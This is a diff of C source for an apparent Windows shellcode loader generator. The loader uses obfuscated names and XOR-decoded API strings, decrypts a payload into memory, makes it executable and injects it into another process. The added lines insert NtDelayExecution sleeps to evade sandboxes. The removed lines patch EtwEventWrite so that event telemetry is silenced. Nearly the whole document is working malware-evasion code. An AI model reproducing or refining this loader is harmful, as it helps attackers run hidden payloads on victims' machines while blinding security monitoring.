@@ -10,6 +10,25 @@
 
 LPVOID (WINAPI * Virt_Alloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
 
+static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+
+static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+
+
+
+static void SleepShort(float milliseconds) {
+    static bool once = true;
+    if (once) {
+        ULONG actualResolution;
+        ZwSetTimerResolution(1, true, &actualResolution);
+        once = false;
+    }
+
+    LARGE_INTEGER interval;
+    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
+    NtDelayExecution(false, &interval);
+}
+
 char XOR_VARIABLE []= "XOR_KEY";
 
 unsigned char fRandom6 []=VIRALO}; 
@@ -118,27 +137,21 @@ int Go(void) {
  
 	unsigned int eRandom5_len = sizeof(eRandom5);
 
-	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
-        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
-
-        #ifdef _WIN64
-        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
-        #else
-        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
-        #endif  
-
-        VirtualProtect(addr, 4096, oldprotect, &oldprotect);
 
 	FreeConsole;
 
 	gRandom7((char *) fRandom6, sizeof (fRandom6), XOR_VARIABLE, sizeof(XOR_VARIABLE));
+
+	SleepShort(3000);
+
         Virt_Alloc= GetProcAddress(GetModuleHandle("kernel32.dll"), fRandom6);
 
 	
 	Random8_mem = Virt_Alloc(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	aRandom1((char *) eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));
+	SleepShort(3000);
 	
-	RtlMoveMemory(Random8_mem, eRandom5, eRandom5_len);
+	RtlCopyMemory(Random8_mem, eRandom5, eRandom5_len);
 	
 	rv = VirtualProtect(Random8_mem, eRandom5_len, PAGE_EXECUTE_READ, &oldprotect);
 
@@ -154,7 +167,7 @@ int Go(void) {
 
 		if (hProc != NULL) {
 			cRandom3(hProc, eRandom5, eRandom5_len);
-			CloseHandle(hProc);
+	//		CloseHandle(hProc);
 		}
 	}
 	return 0;
